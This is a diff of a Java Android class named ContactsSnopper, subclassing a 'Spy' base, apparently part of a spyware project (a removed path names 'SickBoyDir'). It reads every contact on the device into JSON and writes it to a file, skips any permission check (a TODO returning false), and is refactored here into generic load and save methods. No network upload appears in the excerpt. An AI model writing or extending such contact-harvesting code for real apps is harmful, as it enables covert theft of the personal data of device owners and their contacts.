@@ -4,30 +4,30 @@ import android.content.ContentResolver;
 import android.content.Context;
 import android.database.Cursor;
 import android.provider.ContactsContract;
-
-import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileWriter;
-
+import java.io.IOException;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
 public class ContactsSnopper extends Spy {
+    public static final String CONTACTS_FILE_NAME = "contacts.json";
     private Context mContext;
     private final JSONArray contacts = new JSONArray();
 
     public ContactsSnopper(Context context) {
 	mContext = context;
     }
-    
+
     @Override
     public boolean hasPermissions() {
 	// TODO: Check contacts permission
 	return false;
     }
 
-    public ContactsSnopper loadContacts() {
+    @Override
+    public ContactsSnopper load() {
 	ContentResolver contentResolver = mContext.getContentResolver();
 	Cursor contCursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
 						  null, null, null, null);
@@ -72,16 +72,13 @@ public class ContactsSnopper extends Spy {
 	return this;
     }
 
-    public void saveContacts() {
-	try {
-	    File contactsFile = new File("/sdcard/SickBoyDir/temp/Contacts.json");
-	    FileWriter fw = new FileWriter(contactsFile);
-	    BufferedWriter bw = new BufferedWriter(fw);
-	    bw.write(contacts.toString());
-	    bw.close();
-	    fw.close();
-	} catch(Exception e) {
-	    throw new RuntimeException(e);
-	}
+    @Override
+    public boolean save(File file) throws IOException {
+	File contactsFile = new File(file, CONTACTS_FILE_NAME);
+	FileWriter fw = new FileWriter(contactsFile);
+	fw.write(contacts.toString());
+	fw.flush();
+	fw.close();
+	return false;
     }
 }
